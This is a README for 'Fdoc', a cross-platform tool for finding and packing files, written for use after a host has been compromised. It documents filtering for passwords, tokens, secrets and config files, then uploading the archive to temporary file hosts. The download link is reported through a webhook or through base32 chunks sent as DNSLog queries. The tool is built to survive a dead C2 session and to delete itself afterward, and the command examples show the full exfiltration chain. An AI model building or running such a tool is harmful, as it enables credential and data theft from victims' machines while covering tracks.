# Fdoc

File collection utility: filter files on a host and pack them into `tar.gz`.

Optional `-upload` embeds the companion `uploader` tool (auto backend selection + webhook/DNS callback) so the download link can be recovered even if the parent C2 session dies. Without `-upload`, packing stays local and does not open network connections.

Static binaries for Linux, Windows, and macOS.

## Features

- Filter by extension / filename / content keyword / modification date
- Filters combine with **AND**; values inside `-e` / `-f` / `-k` use **OR**
- Default `-e documents` (safer than matching every file)
- Cap total matched logical size (`-max`, default 1GB) with **best-effort** packing
- Skip oversized single files (`-max-file`, default 100MB; `0` disables)
- Skip noisy directories by default (OS-specific); override with `-x`
- Stream while walking (no collect-then-compress memory spike)
- `-size` measures only (disk + logical) and respects `-max` / `-max-file`
- `-q` quiet / `-v` verbose
- `-upload`: auto-select temp host by archive size, then callback
- `-webhook` / `-dns`: HTTPS JSON callback with DNSLog failover
- `-scrub`: after successful upload+callback, delete archive and self binary

> Symlinks are skipped to avoid cycles and permission issues.

## Usage

```text
  -d string       root path to scan (default: user home)
  -e string       extension filter (default: documents)
                  presets: documents, all (common docs+archives+txt; NOT every file),
                           archives|packages, images, videos, any (no ext filter)
  -f string       fuzzy filename match, comma-separated (OR); AND with other filters
  -k string       content keywords, comma-separated (OR); AND with other filters
                  (skips binary; scans up to 8MB per file)
  -max string     max total LOGICAL size of matched files (default 1GB);
                  packing stops at the limit and KEEPS the partial archive (exit 2)
  -max-file string
                  skip a single file larger than this logical size (default 100MB; 0=off)
  -o string       output path (default output_<timestamp>.tar.gz)
  -size           measure matched size only; does not pack; respects -max/-max-file
  -t string       only files modified on/after this local date, e.g. 2023-10-01
  -x string       comma-separated directories to skip (replaces defaults if set)
  -q              quiet mode
  -v              verbose mode (print matched paths)

  -upload         after packing, upload archive and callback (requires -webhook and/or -dns)
  -b string       pin upload backend (default: auto probe+failover by archive size)
  -force          allow flaky/down upload backends
  -webhook string HTTPS URL that accepts POST JSON (download url + metadata)
  -dns string     DNSLog / callback base domain (failover if webhook fails)
  -task-id string task id in callback (auto-generated if empty)
  -cb-timeout float
                  webhook timeout seconds (default 15)
  -scrub          after successful upload+callback, delete archive and self binary
  -encrypt        encrypt stream before upload (requires -key)
  -key string     encryption key for -encrypt (not the same as -k keyword)
```

### Upload + callback

Flow: pack → auto upload by real archive size → HTTPS webhook → DNS failover → optional `-scrub`.

`-webhook` example values:

- `https://webhook.site/<uuid>` (quick test)
- `https://your-vps.example.com/fdoc/hook` (your receiver)

`-dns` example values:

- `xxx.dnslog.cn` / `yyy.ceye.io` / self-hosted `cb.example.com`

Webhook body (`Content-Type: application/json`):

```json
{
  "task_id": "op42",
  "host": "HOSTNAME",
  "url": "https://temp.sh/....",
  "backend": "temp",
  "archive": "/tmp/x.tar.gz",
  "size": 1234567,
  "files": 42,
  "truncated": false,
  "ts": 1710000000
}
```

DNS failover queries (best-effort):

```text
<seq>-<total>-<base32chunk>.<task_id>.<dns-base>
```

Payload decoded from base32 chunks is `task_id|host|url`.

#### Decode DNSLog lines

Paste DNSLog table rows (any base domain: `dnslog.cn`, `dnslog.pp.ua`, …) into the helper script:

```shell
# paste lines, then Ctrl-D
python3 scripts/dnslog_decode.py

# clipboard / file
pbpaste | python3 scripts/dnslog_decode.py
python3 scripts/dnslog_decode.py dnslog.txt

# print URL only
pbpaste | python3 scripts/dnslog_decode.py -q
```

Example input line:

```text
0-4-n5ydimt4....op42.ie0gyx.dnslog.cn	116.x.x.x	2026-07-20 10:05:00
```

Requires all chunks `0`..`total-1` for the same `task_id`. Missing a chunk exits with an error.

Runtime DNS callback also requires **every** chunk query to leave the host (NXDOMAIN counts; per-chunk timeout does not). Partial DNS success is treated as callback failure.

`-scrub` requires `-upload`, and runs only after a fully successful callback (webhook 2xx, or all DNS chunks sent). `-webhook` must be `https://` (or `http://` to loopback for local tests). Omit `-scrub` to keep the archive and binary.

On Unix, `-upload` ignores `SIGHUP` so a dead parent session is less likely to kill the process mid-flight.

### Filter logic

| Expression | Meaning |
|------------|---------|
| `-e pdf -f secret` | pdf **and** filename contains secret |
| `-k password:,token:` | content contains password: **or** token: |
| `-e any` | no extension restriction (still AND with `-f`/`-k`/`-t` if set) |
| `-e all` | common docs + archives + txt only — **not** “all files on disk” |

### Extension presets

| Preset | Includes |
|--------|----------|
| `documents` (default) | pdf/doc/xls/ppt/csv |
| `all` | common docs + archives + txt |
| `archives` / `packages` | zip/rar/7z/tar/gz |
| `images` | jpg/png/gif/bmp |
| `videos` | mp4/mkv/avi/mov |
| `any` | no extension filter |

### Size semantics

| Flag | Uses | Behavior |
|------|------|----------|
| `-size` | disk + logical | Report both; stop early if `-max` would be exceeded |
| `-max` | **logical** cumulative | Archive write budget; truncate keep partial |
| `-max-file` | **logical** per file | Skip file and continue |

Exit codes: `0` ok, `1` error (including invalid `-max`/`-t` / upload/callback failure), `2` truncated at `-max` (still may upload when `-upload` is set).

### Examples

```shell
# 1) Probe size, then pack
Fdoc -d /data/docs -e documents -size
Fdoc -d /data/docs -e documents -max 500MB -o docs.tar.gz

# 2) Default home documents, quiet
Fdoc -q -o docs.tar.gz

# 3) Filename / keyword hits
Fdoc -d /data -f password,secret -e any -o hits.tar.gz
Fdoc -d /data -e txt,ini,conf -k token:,password: -o hits.tar.gz

# 4) Recent files
Fdoc -d /data -e documents -t 2024-01-01 -o recent.tar.gz

# 5) Broader types / no extension filter
Fdoc -e all -size
Fdoc -e any -f config -max-file 0 -o cfg.tar.gz

# 6) Pack → auto upload → callback → scrub
Fdoc -d /data -e documents -o /tmp/x.tar.gz -upload \
  -webhook https://webhook.site/<uuid> \
  -dns xxx.dnslog.cn \
  -task-id op42 -scrub -q
```

Run `Fdoc -h` for the same recipes inline with flag details.

## Build

`uploader` is embedded via `replace uploader => ./third_party/uploader` (see `go.mod`). To hack against a live checkout, point `replace` at that path and re-run `go mod tidy`. Sync notes: [`third_party/README.md`](third_party/README.md).

```shell
go mod tidy
CGO_ENABLED=0 go build -trimpath -ldflags='-s -w' -o Fdoc .

make setup build-linux build-windows build-osx

go test ./...
```

## Smoke / regression

```shell
bash scripts/smoke_regress.sh           # offline pack + flags + DNS decode
ONLINE=1 bash scripts/smoke_regress.sh  # also real upload + local webhook
```

## Layout

```text
main.go              entrypoint
option/              CLI flags
pkg/                 walk / filter / pack / sighup
pkg/compress/        tar.gz writer
pkg/upload/          uploader route wrapper
pkg/callback/        webhook + DNS callback
pkg/scrub/           optional artifact cleanup
scripts/             dnslog_decode.py, smoke_regress.sh
third_party/uploader embedded uploader module (replace target)
logx/                lightweight logging
utils/               helpers
```

## License

MIT (see LICENSE).
